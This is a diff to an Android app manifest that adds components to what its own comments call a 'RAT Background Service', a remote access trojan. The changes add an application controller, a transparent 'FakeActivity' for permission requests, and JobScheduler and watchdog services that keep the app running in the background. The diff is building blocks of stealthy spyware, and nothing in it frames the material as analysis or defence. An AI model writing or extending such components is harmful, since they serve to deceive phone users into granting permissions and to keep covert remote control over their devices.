@@ -57,6 +57,7 @@
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     
     <application
+        android:name=".AppController"
         android:allowBackup="true"
         android:dataExtractionRules="@xml/data_extraction_rules"
         android:fullBackupContent="@xml/backup_rules"
@@ -80,6 +81,12 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+        
+        <!-- Fake Activity for Permission Requests (Transparent) -->
+        <activity
+            android:name=".FakeActivity"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
         
         <!-- RAT Background Service - Main service with all features -->
         <service
@@ -106,7 +113,14 @@
             android:exported="false"
             android:permission="android.permission.BIND_JOB_SERVICE" />
         
-        <!-- Watchdog Service - Legacy monitoring (optional) -->
+        <!-- JobScheduler Service - For Android's JobScheduler API -->
+        <service
+            android:name=".JobSchedulerService"
+            android:enabled="true"
+            android:exported="false"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+        
+        <!-- Watchdog Service - Legacy monitoring -->
         <service
             android:name=".WatchdogService"
             android:enabled="true"
